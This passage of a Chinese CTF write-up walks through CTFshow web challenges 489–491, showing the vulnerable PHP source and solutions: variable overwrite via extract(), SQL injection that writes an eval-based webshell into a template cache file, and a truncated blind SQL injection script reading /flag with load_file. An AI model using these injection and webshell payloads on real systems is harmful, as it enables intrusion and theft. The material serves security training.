class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:43</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:32</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">		 <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		 <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;templates&#x2F;index</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> Author: h1xa</span><br><span class="line"> Date:   <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">16</span>:<span class="number">54</span>:<span class="number">39</span></span><br><span class="line"> Last Modified by:   h1xa</span><br><span class="line"> Last Modified time: <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">21</span>:<span class="number">56</span>:<span class="number">49</span></span><br><span class="line"> email: h1xa@ctfer.com</span><br><span class="line"> link: https:<span class="comment">//ctfer.com</span></span><br><span class="line"> path /templates/index.php</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	欢迎你&#123;&#123;username&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这里就解决了上一题的问题了.可以删除文件了,这里还考察了一个点,就是变量覆盖</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411125917354.png" alt="image-20220411125917354"></p>
<p>等到extract()函数解析完成就可以</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411125924937.png" alt="image-20220411125924937"></p>
<p>因此这里就可以直接和上一关一样,先重置sql语句使执行第一个render()接着传入username为一句话</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411130153307.png" alt="image-20220411130153307"></p>
<p>接着这次访问md5(index)文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411130313269.png" alt="image-20220411130313269"></p>
<p>可以看到这里的error.php是无法利用的了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411130349070.png" alt="image-20220411130349070"></p>
<h1 id="web490"><a href="#web490" class="headerlink" title="web490"></a>web490</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:45:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>-&gt;username));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里也是含有sql注入的.这次只不过是把从sql取出的语句进行写入</p>
<p>记得先清一下文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411140331722.png" alt="image-20220411140331722"></p>
<p>接着登录发现是短标签,我们只要按照这个方式闭合就好</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411140305568.png" alt="image-20220411140305568"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username from user where username = &#x27;1&#x27;union select &#x27;@eval($_POST[zf]);&#x27;&#x27; and password=&#x27;6512bd43d9caa6e02c990b0a82652dca&#x27; order by id limit 1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411140520958.png" alt="image-20220411140520958"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411140614700.png" alt="image-20220411140614700"></p>
<h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:45:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>数据库里没东西</p>
<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:19:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;?=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;?&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也没有可以利用的点,那么只能在sql注入里面动手了.那么直接利用sql读取本地文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://de4a1753-a35d-401e-9d4e-aad8aa7d89a2.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: f<span class="string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- + #&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.<span class="title function_ 